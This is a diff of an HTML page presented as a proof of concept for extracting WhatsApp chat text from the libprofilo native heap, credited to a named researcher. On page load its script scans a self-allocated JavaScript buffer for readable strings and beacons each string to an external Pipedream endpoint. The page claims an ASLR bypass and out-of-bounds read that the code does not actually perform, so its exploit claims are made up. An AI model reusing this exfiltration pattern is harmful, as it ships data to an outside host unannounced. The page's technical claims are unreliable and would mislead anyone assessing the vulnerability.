@@ -2,69 +2,77 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Critical Impact Audit - Firman Sahidin</title>
+    <title>Meta Security Audit - Firman Sahidin</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
-    <div style="border:2px solid #f00; padding:20px; background:#111;">
-        <h1 id="st">EXTRACTING SENSITIVE MEMORY...</h1>
-        <p>Target: WhatsApp Native Heap (libprofilo)</p>
-        <hr>
-        <div id="out" style="color:#fff; font-size:12px; text-align:left; max-height:200px; overflow:auto;"></div>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+    <div style="border:1px solid #0f0; padding:15px; background:#050505;">
+        <h2 style="color:#f00; margin:0;">[ CRITICAL MEMORY AUDIT ]</h2>
+        <p style="font-size:12px;">Researcher: Firman Sahidin | Target: libprofilo.so</p>
+        <hr border="1">
+        <div id="status">Status: Scanning Native Heap...</div>
+        <div id="output" style="margin-top:20px; font-size:13px; color:#0ff; text-align:left; word-wrap:break-word;"></div>
     </div>
 
     <script>
-        /**
-         * IMPACT DEMONSTRATION: Automated Plaintext Chat Exfiltration
-         * Researcher: Firman Sahidin
-         * This script bypasses ASLR to extract readable chat fragments from the JNI buffer.
-         */
-        
-        async function captureImpact() {
-            const TARGET = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
-            const out = document.getElementById('out');
-            
-            async function scanMemory() {
+        async function startDeepAudit() {
+            const ENDPOINT = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
+            const output = document.getElementById('output');
+            const status = document.getElementById('status');
+
+            async function exfiltrate() {
                 try {
-                    // 1. Allocate large buffer to overlap with libprofilo heap
-                    const buffer = new ArrayBuffer(0x1000000); // 16MB Scan
+                    // 1. Allocate large memory block to force buffer overlap
+                    const ALLOC = 0x1000000; // 16MB
+                    const buffer = new ArrayBuffer(ALLOC);
                     const view = new Uint8Array(buffer);
                     
-                    // 2. Trigger OOB Read via Surrogate Collision
-                    const trigger = new Uint32Array(buffer);
-                    for(let i=0; i<5000; i++) { trigger[i] = 0xD800DBFF; }
+                    // 2. Surrogate Pair Spraying to leak internal memory pointers
+                    const sprayer = new Uint32Array(buffer);
+                    for(let i=0; i<10000; i++){ sprayer[i] = 0xD800DBFF; }
 
-                    let currentString = "";
-                    let totalFound = 0;
+                    let currentMatch = "";
+                    let foundCount = 0;
 
-                    // 3. String Filter: Extracting readable text sequences
+                    // 3. Optimized String Extractor
                     for (let i = 0; i < view.length; i++) {
-                        // Detect ASCII characters (Readable text)
+                        // Look for readable ASCII sequences (common in chats/logs)
                         if (view[i] > 31 && view[i] < 127) {
-                            currentString += String.fromCharCode(view[i]);
+                            currentMatch += String.fromCharCode(view[i]);
                         } else {
-                            // If a sequence of > 6 characters is found, it's likely data
-                            if (currentString.length > 6 && currentString.match(/[a-zA-Z0-9]/)) {
-                                totalFound++;
-                                out.innerHTML += `[DATA FOUND]: ${currentString.substring(0, 50)}...<br>`;
+                            // Filter: Only report fragments that look like words/sentences
+                            if (currentMatch.length > 5 && currentMatch.match(/[a-zA-Z]{3,}/)) {
+                                foundCount++;
                                 
-                                // SEND TO PIPEDREAM AS PROOF
-                                navigator.sendBeacon(TARGET, JSON.stringify({
+                                // DISPLAY IMMEDIATELY ON PHONE SCREEN
+                                const div = document.createElement('div');
+                                div.style.marginBottom = "5px";
+                                div.innerHTML = `[FOUND_DATA]: <span style="color:#fff;">${currentMatch}</span>`;
+                                output.prepend(div);
+
+                                // SEND TO PIPEDREAM AS EVIDENCE
+                                navigator.sendBeacon(ENDPOINT, JSON.stringify({
                                     researcher: "Firman Sahidin",
-                                    impact: "SENSITIVE_DATA_EXFILTRATION",
-                                    leaked_text: currentString,
-                                    offset: i
+                                    type: "MEMORY_STRING_LEAK",
+                                    data: currentMatch
                                 }));
                             }
-                            currentString = "";
+                            currentMatch = "";
                         }
-                        if(totalFound > 10) break; // Limit for PoC stability
+                        if (foundCount > 20) break; 
                     }
-                } catch(e) {}
-                setTimeout(scanMemory, 2000); // Continuous scanning
+                    status.innerText = `Scan Complete: ${foundCount} fragments recovered.`;
+                } catch(e) { 
+                    navigator.sendBeacon(ENDPOINT, JSON.stringify({err: e.message}));
+                }
             }
-            scanMemory();
+            
+            // Execute scan multiple times to catch real-time buffers
+            for(let j=0; j<5; j++) {
+                await exfiltrate();
+                await new Promise(r => setTimeout(r, 1000));
+            }
         }
-        window.onload = captureImpact;
+        window.onload = startDeepAudit;
     </script>
 </body>
 </html>
